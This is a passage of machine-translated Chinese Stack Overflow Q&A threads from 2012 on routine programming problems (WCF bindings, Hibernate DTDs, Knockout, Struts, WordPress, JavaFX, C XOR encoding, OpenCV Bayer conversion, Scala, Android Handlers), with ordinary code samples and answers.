Activity: Listen at 'http://mycomputer/MyWs.svc
<Exception>
  <ExceptionType>System.ServiceModel.ProtocolException, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</ExceptionType>
  <Message>Content Type application/soap+xml;charset=UTF-8;action="http://tempuri.org/FetchMyThing" was sent to a service expecting text/xml; charset=utf-8\.  The client and service bindings may be mismatched.   
  </Message>
(erroneous detail snipped)
</Exception> 
```

因此，如果相信此消息，我的合同和服务绑定可能不匹配，但根据我对 WCF 的理解，我的配置（或至少其背后的意图）是正确的。

有人对我的配置有什么问题有任何想法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-02T06:55:54.260

我唯一能想到的是，因为您没有详细指定绑定，并且它使用 HTTP（根据此：“Listen at ' [http://mycomputer/MyWs.svc](http://mycomputer/MyWs.svc) '”）然后它是否为此使用默认值（即`basicHttpBinding`），这会造成不匹配？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-10-18T19:23:10.393

当我的服务有多个绑定时，我遇到了同样的问题。当我删除所有绑定并且只留下一个未命名的绑定时，错误消息消失了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-07T21:41:32.953

请查看此链接[How to: Configure WCF Service to Interoperate with ASP.NET Web Service Clients](https://msdn.microsoft.com/en-us/library/ms731134(v=vs.110).aspx) 。

> 若要将 Windows Communication Foundation (WCF) 服务终结点配置为与 ASP.NET Web 服务客户端可互操作，请使用 System.ServiceModel。**BasicHttpBinding**类型作为服务端点的绑定类型。

此外，定义两个端点，您可以使用同一服务的 HTTP 和 HTTPS 版本

# java - 离线工作java Hibernate 3.3.2.GA？

> ID：10403817
> 
> 赞同：2
> 
> 时间：2012-05-01T20:23:06.557
> 
> 标签：java, xml, dtd

我在离线解析 Hibernate 的 XML 时遇到问题。我需要知道在没有网络连接时如何指定 DTD。这是我的休眠配置。

```
 <?xml version="1.0" encoding="utf-8"?>
     <!DOCTYPE hibernate-configuration PUBLIC
   "-//Hibernate/Hibernate Configuration DTD 3.0//EN"
      "http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd">
 <hibernate-configuration>
  <session-factory>
   <!-- Database connection settings -->
 <property name="connection.driver_class">com.mysql.jdbc.Driver</property>
<property name="connection.url">jdbc:mysql://localhost:3306/global_data</property>
<property name="connection.username">root</property>
<property name="connection.password">pass</property> 
```

. . .

我试图在 xml 配置中将 PUBLIC 更改为 SYSTEM，但仍然出现错误。我正在使用 Eclipse IDE，我只是将我的项目构建路径指向我手动导入所有休眠库的用户库。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:49:18.500

您需要将映射添加到您的 Eclipse IDE。为此，导航到 XML -> XML Catalog 菜单。然后你需要添加一个条目。对于位置，您需要指定 dtd 文件所在的位置。有一种方法可以在 jar 中查找文件，但目前我找不到如何去做。对于密钥类型，您可以根据您拥有的关键字选择 Public ID 或 System ID`PUBLIC`或`SYSTEM`。然后对于您要输入的密钥`-//Hibernate/Hibernate Configuration DTD 3.0//EN`，可选择`http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd`在备用网址字段中提供地址。

为了便于使用，我发现在 jar 中找到 dtd 很有用，然后将其放入工作区中名为 resources 的项目中，但指定 jar 位置会更正确。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-07T14:53:57.843

我的快速两步解决方案：

1) 在 hibernate.cfg.xml 所在的同一个 Eclipse 包中创建一个名为 hibernate-configuration-3.0.dtd 的空文件。

然后，当您在线时，将 [http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd](http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd)中的文本下载/复制到您创建的空 dtd 文件中。

2) 现在，当您离线时，将 hibernate.cfg.xml 中的第二行从这里更改为

!DOCTYPE hibernate-configuration PUBLIC "-//Hibernate/Hibernate Configuration DTD 3.0//EN" " [http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd](http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd) ">

对此

!DOCTYPE hibernate-configuration SYSTEM "classpath:///hibernate-configuration-3.0.dtd">

（请注意，我必须删除前导小于字符才能使 !DOCTYPE 显示在此答案中......所以请务必在第二行的开头重新输入）

我将“在线”和“离线”设置都保存在 xml 底部的注释中，以便来回切换。

# button - 如何使用 Knockout.js 绑定一组动态 jQuery Mobile 按钮？

> ID：10403821
> 
> 赞同：6
> 
> 时间：2012-05-01T20:23:24.753
> 
> 标签：button, jquery-mobile, knockout.js

我正在使用 jQuery Mobile (jQM) 和 Knockout.js (ko) 来开发应用程序。在这个应用程序中，我需要生成由不断更新的 Web 服务定义的可变数量的按钮。

所以，在我的标记中，我有：

```
<div id="answerPage-buttons" data-bind="foreach: buttonsLabels">
    <button data-role="button" data-inline="true" data-theme="b" data-bind="text: text, click: $root.submitAnswer" />
</div> 
```

buttonLabels 是从 Web 服务返回的短字符串列表。它定义为：

```
self.buttonLabels = ko.observableArray(); 
```

当按钮不是“jQM 样式”时，这一切都可以正常工作。但是，当我使用以下方式设置它们的样式时：

```
$("#answerPage-buttons").trigger("create"); 
```

更新过程中出现问题。

问题似乎是 jQM 将按钮包装在一个 div 中（具有同级跨度），以使它们看起来都很好并且具有移动性。但是，当 ko 通过绑定应用更新时，它只删除标签，留下周围的东西，并添加新的按钮标签 - 然后也由 jQM 触发器调用设置样式。

所以，我最终得到了一个不断增长的按钮列表——只有最后一组可以操作（因为之前的按钮被移除了按钮元素，但所有样式都保留了下来）。

我认为，通过在可观察对象更新后立即发出以下调用，我已经设法解决了这个问题：

```
$("#answerPage-buttons div.ui-btn").remove(); 
```

但是，我的感觉是可能有更好的方法。有没有？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-02T12:20:52.480

我找到了解决方案。

如果我用 div 包围按钮，它似乎可以工作 - 例如

```
<div id="answerPage-buttons" data-bind="foreach: buttonsLabels">
    <div>
        <button data-role="button" data-inline="true" data-theme="b" data-bind="text: text, click: $root.submitAnswer" />
    </div>
</div> 
```

我猜这是因为 jQM 添加的标记保留在 ko 复制的标记“内部”。如果没有 div，jQM 会包装 button 标签，它是包含 ko foreach 绑定的标签的直接子标签。

# struts - 内容类型在struts中不起作用

> ID：10403823
> 
> 赞同：1
> 
> 时间：2012-05-01T20:23:36.420
> 
> 标签：struts, struts-1, struts-validation, struts1

这是写在我的验证方法中的。检查大小和空上传是有效的，但内容类型不是，我错过了什么吗？

```
public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {
    ActionErrors errors = new ActionErrors();

    if(file1.getFileSize()==0)
    {
    errors.add("file1", new ActionMessage("error.file.required"));
    }
    else if(!file1.getContentType().equals("audio/mpeg"));
    {
    errors.add("file1",new ActionMessage("error.file.type"));
    }
    if(file1.getFileSize()>51200)
    {
    errors.add("file1",new ActionMessage("error.file.size"));
    }

    return errors; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-02T08:26:57.197

我认为您的 else if 条件语句由于“;”而丢失 签署如下：

```
else if(!file1.getContentType().equals("audio/mpeg")); 
```

它应该如下所示：

```
else if(!file1.getContentType().equals("audio/mpeg")) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-03T09:52:11.683

完成：

```
else if(!file1.getContentType().equals("audio/mp3")) { ---- } 
```

我检查了文件上传的类型：`String ctype = file1.getContentType();`没有进行任何验证（即上传任何文件）并将其打印在jsp页面上。从那里我知道它的音频/mp3。现在所有验证都在工作。/

# asp.net - 我在 DAL 中使用工作单元模式，但我需要在 Application_Start 中执行数据访问。我该怎么办？

> ID：10403836
> 
> 赞同：0
> 
> 时间：2012-05-01T20:24:16.307
> 
> 标签：asp.net, nhibernate, iis-7, httpcontext, unit-of-work

鉴于：

*   在 ASP.NET 中使用带有 ORM 的 Unit Of Work 模式时，UnitOfWork 对象包含对 HttpContext 的引用。

问题：

*   但是如果我需要在 Application_Start 中执行一些数据访问（[尤其是在 IIS7 中](http://mvolo.com/blogs/serverside/archive/2007/11/10/Integrated-mode-Request-is-not-available-in-this-context-in-Application_5F00_Start.aspx)）怎么办？
*   工作单元模式是否仍然可行？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:32:36.780

为什么你的工作单元持有对 HttpContext 的引用？进入会话状态？如果是这种情况，让它持有更抽象的东西（即接口），它在 Application_Start 中将代表一个不需要 HttpContext 的具体类，而其他任何地方都是另一个（在内部使用 HttpContext）

# wordpress - Wordpress：在 wp_nav_menu 中添加变量

> ID：10403837
> 
> 赞同：-1
> 
> 时间：2012-05-01T20:24:24.240
> 
> 标签：wordpress, menu, nav

我正在尝试在 wp_nav_menu 中添加一个变量，我不知道该怎么做，请帮助我！这是代码片段：

```
wp_nav_menu(array(
                'menu' => 'Main Menu',
                'theme_location' => 'Main Menu',
                'container' => null,
                'container_class' => '',
                'menu_id' => 'header-menu',
                'menu_class' => '',
                'before' => '<span class="text1">',
                'after' => '</span><span class="text2"><a href="">' . the_title($post->ID) . '</a></span>',
            )); 
```

请帮我！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:28:02.377

你是这个意思吗？您可能需要进一步解释一下，但这就是您将一些附加值添加到`wp_nav_menu`.

```
wp_nav_menu(array(
            'MyItem' => 'My Value',                 // <--new item
            'MyotherItem' => 'My Other Value',      // <--other new item
            'menu' => 'Main Menu',
            'theme_location' => 'Main Menu',
            'container' => null,
            'container_class' => '',
            'menu_id' => 'header-menu',
            'menu_class' => '',
            'before' => '<span class="text1">',
            'after' => '</span><span class="text2"><a href="">' . the_title($post->ID) . '</a></span>',
)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:28:22.833

看看[这个教程](http://www.kriesi.at/archives/improve-your-wordpress-navigation-menu-output)。它很可能会回答您的问题等等

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T10:34:06.317

试试这个，这将添加 URL

```
wp_nav_menu( array( 'theme_location' => 'header-menu','menu_class' => 'drop', 'container' => 'nav', 'link_before' => '<span></span>') ); 
```

如果你想这样 url

```
 wp_nav_menu( array( 'theme_location' => 'header-menu','menu_class' => 'drop', 'container' => 'nav', 'link_before' => '<span>', 'link_after' => '</span>') ); 
```

# accordion - 防止 JavaFX 中的手风琴折叠

> ID：10403838
> 
> 赞同：8
> 
> 时间：2012-05-01T20:24:25.330
> 
> 标签：accordion, javafx-2

有没有一种简单的方法可以防止 JavaFX 2.1 中的手风琴完全崩溃？我有一个带有几个条目的手风琴，但是如果用户单击活动的手风琴条目，它会折叠手风琴。

我可能可以使用鼠标单击侦听器来检查是否进行检查并采取相应的行动，但这感觉应该比完成更简单。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-01T23:51:50.047

向当前展开的手风琴窗格添加一个侦听器，并通过修改它的 collapsible 属性来防止它被用户折叠。

这是一个示例应用程序：

```
import javafx.application.Application;
import javafx.application.Platform;
import javafx.beans.value.*;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.layout.*;
import javafx.stage.Stage;

public class AccordionSample extends Application {
  public static void main(String[] args) { launch(args); }
  @Override public void start(Stage primaryStage) {
    // create some titled panes to go in an accordion.
    TitledPane adminPane = new TitledPane("Animals", 
      VBoxBuilder.create().style("-fx-padding: 10").spacing(10).children(
        ButtonBuilder.create().text("Zebra").maxWidth(Double.MAX_VALUE).build(),
        ButtonBuilder.create().text("Shrew").maxWidth(Double.MAX_VALUE).build()
      ).build()            
    );
    TitledPane viewPane = new TitledPane("Vegetables", 
      VBoxBuilder.create().style("-fx-padding: 10").spacing(10).children(
        ButtonBuilder.create().text("Eggplant").maxWidth(Double.MAX_VALUE).build(),
        ButtonBuilder.create().text("Carrot").maxWidth(Double.MAX_VALUE).build()
      ).build()            
    );

    // create an accordion, ensuring the currently expanded pane can not be clicked on to collapse.
    Accordion accordion = new Accordion();
    accordion.getPanes().addAll(adminPane, viewPane);
    accordion.expandedPaneProperty().addListener(new ChangeListener<TitledPane>() {
      @Override public void changed(ObservableValue<? extends TitledPane> property, final TitledPane oldPane, final TitledPane newPane) {
        if (oldPane != null) oldPane.setCollapsible(true);
        if (newPane != null) Platform.runLater(new Runnable() { @Override public void run() { 
          newPane.setCollapsible(false); 
        }});
      }
    });
    for (TitledPane pane: accordion.getPanes()) pane.setAnimated(false);
    accordion.setExpandedPane(accordion.getPanes().get(0));

    // layout the scene.
    StackPane layout = new StackPane();
    layout.setStyle("-fx-padding: 10; -fx-background-color: cornsilk;");
    layout.getChildren().add(accordion);
    primaryStage.setScene(new Scene(layout));
    primaryStage.show();
  }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2015-12-07T07:00:21.797

这是确保手风琴永远不会完全崩溃的另一种解决方案。与@jewelsea 的原始答案的区别很小 - 我不喜欢默认向下箭头从打开的手风琴 TitledPane 面上消失的事实，因为它的“可折叠”属性被设置为 false。我更多地使用它来为我的界面实现更“自然”的感觉。

```
 /* Make sure the accordion can never be completely collapsed */
    accordeon.expandedPaneProperty().addListener((ObservableValue<? extends TitledPane> observable, TitledPane oldPane, TitledPane newPane) -> {
        Boolean expand = true; // This value will change to false if there's (at least) one pane that is in "expanded" state, so we don't have to expand anything manually
        for(TitledPane pane: accordeon.getPanes()) {
            if(pane.isExpanded()) {
                expand = false;
            }
        }
        /* Here we already know whether we need to expand the old pane again */
        if((expand == true) && (oldPane != null)) {
            Platform.runLater(() -> {
                accordeon.setExpandedPane(oldPane);
            });
        }
    }); 
```

# c - 解码文件

> ID：10403840
> 
> 赞同：1
> 
> 时间：2012-05-01T20:24:32.367
> 
> 标签：c, windows, xor

```
#include <Windows.h>
#include <cstdio>
const int KEY=111;

void encryptStrA(char* sometext)
{
    int length;
    length=strlen(sometext);
    for(int i=0; i<length;i++)
        sometext[i]^=KEY;
}

int main(void)
{   
    FILE* pFile=fopen("pliczek","wb");
    char sign;
    char sampleString[]="Hello world!";

    encryptStrA(sampleString);
    fprintf(pFile,"%c%c%s%c%c",13^KEY,10^KEY,sampleString,13^KEY,10^KEY);
    fclose(pFile);

    pFile=fopen("pliczek","rb");
    while(!feof(pFile))
    {   
        fscanf(pFile,"%c",&sign);
        printf("%c",sign^KEY);
    }

    fclose(pFile);
    system("PAUSE");
    return 0;
} 
```

我回避了一些棘手的事情

1.  文件以二进制模式打开
2.  在 encryptStrA 中，strlen 函数没有直接放在循环条件中

尽管如此，它仍然输出的是“Hell”而不是“Hello World！”？更准确地说，是在找到关键人物后将所有内容都剪掉。原因是什么？我使用操作系统，其中每一行文本都以回车符（ASCII 13）和换行符（10）结束。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:28:05.490

该代码`fprintf("%s", s);`期望 s 是一个以零结尾的字符串。当您到达`'o'^111`它时，它会给出一个空字符，因此字符串的其余部分不会写入文件。

你可以[`fwrite`](http://www.cplusplus.com/reference/clibrary/cstdio/fwrite/)改用。

# image - 使用 OpenCV 将 12 位拜耳图像转换为 8 位 RGB

> ID：10403841
> 
> 赞同：11
> 
> 时间：2012-05-01T20:24:45.733
> 
> 标签：image, opencv, rgb

我正在尝试使用 OpenCV 2.3.1 将 12 位拜耳图像转换为 8 位 RGB 图像。使用 cvCvtColor 函数似乎应该相当简单，但是当我使用以下代码调用它时，该函数会引发异常：

```
int cvType = CV_MAKETYPE(CV_16U, 1);
cv::Mat bayerSource(height, width, cvType, sourceBuffer);
cv::Mat rgbDest(height, width, CV_8UC3);
cvCvtColor(&bayerSource, &rgbDest, CV_BayerBG2RGB); 
```

我以为我跑过了 sourceBuffer 的末尾，因为输入数据是 12 位的，我必须传入 16 位类型，因为 OpenCV 没有 12 位类型。所以我将宽度和高度除以 2，但 cvCvtColor 仍然抛出了一个没有任何有用信息的异常（错误消息是“未知异常”）。

几个月前发布了一个[类似的问题，但从未得到回答，但由于我的问题更具体地涉及 12 位拜耳数据，我认为它足够独特，值得提出一个新问题。](https://stackoverflow.com/questions/7598854/how-do-i-convert-bayer-to-rgb-using-opencv-and-vice-versa)

提前致谢。

**编辑**：我一定遗漏了一些东西，因为我什至无法让 cvCvtColor 函数处理 8 位数据：

```
cv::Mat srcMat(100, 100, CV_8UC3);
const cv::Scalar val(255,0,0);
srcMat.setTo(val);
cv::Mat destMat(100, 100, CV_8UC3);
cvCvtColor(&srcMat, &destMat, CV_RGB2BGR); 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-04T18:34:15.997

我能够使用以下代码将我的数据转换为 8 位 RGB：

```
// Copy the data into an OpenCV Mat structure
cv::Mat bayer16BitMat(height, width, CV_16UC1, inputBuffer);

// Convert the Bayer data from 16-bit to to 8-bit
cv::Mat bayer8BitMat = bayer16BitMat.clone();
// The 3rd parameter here scales the data by 1/16 so that it fits in 8 bits.
// Without it, convertTo() just seems to chop off the high order bits.
bayer8BitMat.convertTo(bayer8BitMat, CV_8UC1, 0.0625);

// Convert the Bayer data to 8-bit RGB
cv::Mat rgb8BitMat(height, width, CV_8UC3);
cv::cvtColor(bayer8Bit, rgb8BitMat, CV_BayerGR2RGB); 
```

我错误地认为我从相机获取的 12 位数据是紧密打包的，因此两个 12 位值包含在 3 个字节中。事实证明，每个值都包含在 2 个字节中，因此我无需进行任何解包即可将数据放入 OpenCV 支持的 16 位数组中。

**编辑：**请参阅@petr 改进的答案，该答案在转换为 8 位之前转换为 RGB，以避免在转换过程中丢失任何颜色信息。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2017-07-21T14:27:13.653

The Gillfish's answer technically works but during the conversion it uses smaller data structure (CV_8UC1) than the input (which is CV_16UC1) and loses some color information.

I would suggest first to decode the Bayer encoding but stay in 16-bits per channel (from CV_16UC1 to CV_16UC3) and later convert to CV_8UC3\.

The modified Gillfish's code (assuming the camera gives image in 16bit Bayer encoding):

```
// Copy the data into an OpenCV Mat structure
cv::Mat mat16uc1_bayer(height, width, CV_16UC1, inputBuffer);

// Decode the Bayer data to RGB but keep using 16 bits per channel
cv::Mat mat16uc3_rgb(width, height, CV_16UC3);
cv::cvtColor(mat16uc1_bayer, mat16uc3_rgb, cv::COLOR_BayerGR2RGB);

// Convert the 16-bit per channel RGB image to 8-bit per channel
cv::Mat mat8uc3_rgb(width, height, CV_8UC3);
mat16uc3_rgb.convertTo(mat8uc3_rgb, CV_8UC3, 1.0/256); //this could be perhaps done more effectively by cropping bits 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-03-05T14:28:45.747

对于任何为此苦苦挣扎的人，上述解决方案仅在您的图像实际上是 16 位的情况下才有效，否则，正如评论已经建议的那样，您应该切断 4 个最低有效位。我做到了这一点。它不是很干净，但它可以工作。

```
unsigned short * image_12bit = (unsigned short*)data;
char out[rows * cols];

for(int i = 0; i < rows * cols; i++) {
  out[i] = (char)((double)(255 * image_12bit[i]) / (double)(1 << 12));
}

cv::Mat bayer_image(rows, cols, CV_8UC1, (void*)out);
cv::cvtColor(bayer_image, *res, cv::COLOR_BayerGR2BGR); 
```

# arrays - 在 Scala 中使用模式匹配交换数组中的值

> ID：10403844
> 
> 赞同：1
> 
> 时间：2012-05-01T20:24:54.643
> 
> 标签：arrays, scala, pattern-matching

我正在尝试[为不耐烦的 Scala](https://rads.stackoverflow.com/amzn/click/com/0321774094)解决以下问题。问题如下：

> 使用模式匹配，编写一个函数 swap 交换数组的前两个元素，前提是它的长度至少为两个。

我的解决方案是：

```
def swap(sArr:Array[Int]) = sArr.splitAt(2) match { 
                               case (Array(x,y),Array(z)) => Array(y,x,z)
                               case (Array(x,y),Array()) => Array(y,x)
                               case _ => sArr
                            } 
```

我的问题是第一个案例陈述。我认为它会进行模式匹配，`(Array(1,2),Array(3))`而我打算将其模式匹配`(Array(1,2),Array(3,4,5.....))`

有人可以指出这怎么可能。

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-01T20:27:12.383

您的代码的问题在于`Array(z)`“匹配一个元素数组”。你想要的是`z`成为整个数组，不管有多少元素：

```
def swap(sArr: Array[Int]) = 
  sArr.splitAt(2) match { 
    case (Array(x, y), z) => Array(y, x) ++ z
    case _ => sArr
} 
```

但是，我会使用序列匹配语法编写它，`_*`这样您就不必手动拆分数组：

```
def f(a: Array[Int]) = 
  a match {
    case Array(x, y, z @ _*) => Array(y, x) ++ z
    case _ => a
} 
```

# java - Java 无法在未调用 Looper.prepare() 的线程内创建处理程序

> ID：10403858
> 
> 赞同：3
> 
> 时间：2012-05-01T20:25:57.803
> 
> 标签：java, android

我看到了大多数相关问题，但找不到任何可以解决我的问题的问题。

这是我的代码，我不知道我做错了什么。

```
static class NamedFile {
    public File f;

    public String name;
    public String ext;
    public String path;
    public BitmapDrawable icon;

    public NamedFile (File file) {
        f = file;
        name = f.getName();
        if (f.isFile()) {
            if (name.indexOf('.') != -1) {
                ext = name.substring(name.lastIndexOf('.') + 1).trim().toLowerCase();
            } else {
                ext = "unknown";
            }
        }
        path = f.getAbsolutePath();

        if (ext == null) {
            icon = mFolderIcon;
        } else {
            BitmapDrawable i = icons.get(ext);
            if (i == null) {
                    try {
                        int rid = R.drawable.class.getField(ext).getInt(R.drawable.class);
                        icons.put(ext, new BitmapDrawable(Bitmap.createScaledBitmap(BitmapFactory.decodeResource(res, rid, mOpts), iconSize, iconSize, false)));
                        icon = icons.get(ext);
                    } catch (Exception e1) {}
            } else {
                icon = i;
            }
        }/* else if (ext.equals("jpeg") || ext.equals("jpg") || ext.equals("bmp") || ext.equals("gif") || ext.equals("png")) {
            Bitmap b = BitmapFactory.decodeFile(path, mOpts);
            if (b != null) {
                icon = new BitmapDrawable(Bitmap.createScaledBitmap(b, iconSize, iconSize, false));
            }
        }*/

        if (ext != null && (ext.equals("jpeg") || ext.equals("jpg") || ext.equals("bmp") || ext.equals("gif") || ext.equals("png"))) {
            /*
            Bitmap b = BitmapFactory.decodeFile(path, mOpts);
            if (b != null) {
                icon = new BitmapDrawable(Bitmap.createScaledBitmap(b, iconSize, iconSize, false));
            }
            */

            final Handler handler = new Handler() {
                @Override
                public void handleMessage(Message message) {
                    HashMap<String, Object> m = ((HashMap<String, Object>)message.obj);
                    sendThumbnail ((String)m.get("path"), (byte[])m.get("data"));
                }
            };

            Thread thread = new Thread() {
                public void writeInt (byte[] buff, int pos, int value) {
                    buff[pos] = (byte)(value >>> 24);
                    buff[pos + 1] = (byte)(value >>> 16);
                    buff[pos + 2] = (byte)(value >>> 8);
                    buff[pos + 3] = (byte)value;
                }

                @Override
                public void run() {
                    try {
                        Bitmap b = BitmapFactory.decodeFile(path, mOpts);
                        if (b.getHeight() > 256 || b.getWidth() > 256) {
                            float r;
                            if (b.getHeight() > b.getWidth()) {
                                r = 128f / b.getHeight();
                            } else {
                                r = 128f / b.getWidth();
                            }

                            b = Bitmap.createScaledBitmap(b, (int)(r * b.getWidth()), (int)(r * b.getHeight()), false);

                            byte[] buffer = new byte[b.getWidth() * b.getHeight() * 4 + 8];

                            writeInt (buffer, 0, b.getWidth());
                            writeInt (buffer, 4, b.getHeight());

                            int i = 8;
                            for (int y = 0; y < b.getHeight(); y ++) {
                                for (int x = 0; x < b.getWidth(); x ++) {
                                    writeInt (buffer, i, b.getPixel(x, y));

                                    i += 4;
                                }
                            }

                            HashMap<String, Object> msg = new HashMap<String, Object>();

                            msg.put("path", path);
                            msg.put("data", buffer);

                            Message message = handler.obtainMessage(1, msg);
                            handler.sendMessage(message);
                        }
                    } catch (Exception e) {
                        sendLog (e.toString());
                    }
                }
            };
            thread.start();

        }

        if (icon == null) {
            icon = mFileIcon;
        }
    }
    public NamedFile () {
    }

    public NamedFile simpleClone () {
        final NamedFile nf = new NamedFile();

        nf.name = name;
        nf.ext = ext;
        nf.path = path;

        return nf;
    }
} 
```

这嵌套在 if 语句中，该语句位于静态类的构造函数中，并且静态类位于扩展 ListActivity 的公共类中。我是 Java 新手。

错误：

```
05-01 20:21:58.810: E/AndroidRuntime(584): Uncaught handler: thread AsyncTask #1 exiting due to uncaught exception
05-01 20:21:58.830: E/AndroidRuntime(584): java.lang.RuntimeException: An error occured while executing doInBackground()
05-01 20:21:58.830: E/AndroidRuntime(584):  at android.os.AsyncTask$3.done(AsyncTask.java:200)
05-01 20:21:58.830: E/AndroidRuntime(584):  at java.util.concurrent.FutureTask$Sync.innerSetException(FutureTask.java:273)
05-01 20:21:58.830: E/AndroidRuntime(584):  at java.util.concurrent.FutureTask.setException(FutureTask.java:124)
05-01 20:21:58.830: E/AndroidRuntime(584):  at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:307)
05-01 20:21:58.830: E/AndroidRuntime(584):  at java.util.concurrent.FutureTask.run(FutureTask.java:137)
05-01 20:21:58.830: E/AndroidRuntime(584):  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1068)
05-01 20:21:58.830: E/AndroidRuntime(584):  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:561)
05-01 20:21:58.830: E/AndroidRuntime(584):  at java.lang.Thread.run(Thread.java:1096)
05-01 20:21:58.830: E/AndroidRuntime(584): Caused by: java.lang.RuntimeException: Can't create handler inside thread that has not called Looper.prepare()
05-01 20:21:58.830: E/AndroidRuntime(584):  at android.os.Handler.<init>(Handler.java:121)
05-01 20:21:58.830: E/AndroidRuntime(584):  at greg.projects.FileTransfer.FileTransferActivity$NamedFile$1.<init>(FileTransferActivity.java:588)
05-01 20:21:58.830: E/AndroidRuntime(584):  at greg.projects.FileTransfer.FileTransferActivity$NamedFile.<init>(FileTransferActivity.java:588)
05-01 20:21:58.830: E/AndroidRuntime(584):  at greg.projects.FileTransfer.FileTransferActivity$GesturesLoadTask.doInBackground(FileTransferActivity.java:489)
05-01 20:21:58.830: E/AndroidRuntime(584):  at greg.projects.FileTransfer.FileTransferActivity$GesturesLoadTask.doInBackground(FileTransferActivity.java:1)
05-01 20:21:58.830: E/AndroidRuntime(584):  at android.os.AsyncTask$2.call(AsyncTask.java:185)
05-01 20:21:58.830: E/AndroidRuntime(584):  at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:305)
05-01 20:21:58.830: E/AndroidRuntime(584):  ... 4 more 
```

（FileTransferActivity.java:588 是`final Handler handler = new Handler() {`）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-01T20:46:13.997

A`Handler`基本上是一个回调类，当您向它发送某种形式的消息时，Android 使用它来异步运行代码。为了`Handler`在与 UI 线程不同的线程中接收和处理消息，它必须保持线程打开。这就是[Looper](http://developer.android.com/reference/android/os/Looper.html)类的用武之地。就像在页面示例中一样，`Looper.prepare()`在方法的顶部`run()`调用，然后`Looper.loop()`在底部调用。该线程将保持打开状态，直到您明确销毁它。为了销毁`Looper`线程，您的`Thread`类中必须有一个调用`Looper.getMyLooper().quit()`.

一个示例线程类将是这样的：

```
class LooperThread extends Thread {
  public Handler mHandler;
  private volatile Looper mMyLooper;

  public void run() {
    Looper.prepare();

    mHandler = new Handler() {
       public void handleMessage(Message msg) {
          // process incoming messages here
       }
    };

    mMyLooper = Looper.getMyLooper();

    Looper.loop();
  }

  public void killMe(){
     mMyLooper.quit();
  }
} 
```

通过创建线程的新对象来正常运行线程。

```
LooperThread myLooperThread = new LooperThread(); 
```

保持对它的引用。然后调用：

```
myLooperThread.killMe(); 
```

每当您希望线程死亡时。这通常在Activity 的 、 或 方法`onPause()`中`onStop()`。`onDestroy()`

请注意，**当活动关闭时，这种性质的线程将保持打开状态，因此您必须在用户退出之前将其终止**。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T07:04:10.733

在 UI 线程上运行指定的操作

```
 ActivityName.runOnUiThread(new Runnable() {
 public void run()
    {
     //put your logic here
    }
 }); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T20:47:41.650

我推荐使用 HandlerThread，因为它为你准备了 looper。

[http://developer.android.com/reference/android/os/HandlerThread.html](http://developer.android.com/reference/android/os/HandlerThread.html)

# android - 如何为 ListView 的拇指设置固定大小？

> ID：10403860
> 
> 赞同：3
> 
> 时间：2012-05-01T20:25:59.663
> 
> 标签：android

我正在为 ListView 使用自定义拇指：

![拇指](../Images/4f1352b5c60dc82fb9a0c387307ffd5f.png)

使用风格

```
<style name="CustomTheme" parent="@android:style/Theme.NoTitleBar">
    <item name="android:scrollbarThumbVertical">@drawable/scroll_thumb</item>
</style> 
```

但在应用程序中它看起来像：

![问题](../Images/25799e48400c358ab1406dd4320674c4.png)

如何设置拇指大小？

**编辑**

我不想使用九补丁图像。我需要为我的拇指设置固定大小。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-02-02T03:53:11.447

答案很简单，不要使用九补丁。

我没有将“android:scrollbarThumbVertical”定义为样式或主题，而是在您的 xml 布局文件中的 ListView 或 ScrollView 中定义它，如下所示：

```
<ListView
    android:id="@+id/listView"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:scrollbarAlwaysDrawVerticalTrack="true"
    android:scrollbarStyle="outsideOverlay"
    android:scrollbars="vertical"
    android:fadeScrollbars="true"
    **android:scrollbarThumbVertical="@drawable/scrollbar_vertical_thumb"**
    android:scrollbarTrackVertical="@drawable/scrollbar_vertical_track"
    android:scrollbarFadeDuration="500"
    android:scrollbarDefaultDelayBeforeFade="1000">
</ListView> 
```

在它说“@drawable/scrollbar_vertical_thumb”的地方，编辑名为 scrollbar_vertical_thumb 的可绘制文件以包含以下内容作为整个可绘制对象：

```
<?xml version="1.0" encoding="utf-8"?>
    <bitmap
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:src="@drawable/ic_launcher"
        android:gravity="center">
    </bitmap> 
```

现在，实际上将在轨道上显示为拇指的内容将是您作为源（src）放置的任何可绘制对象。

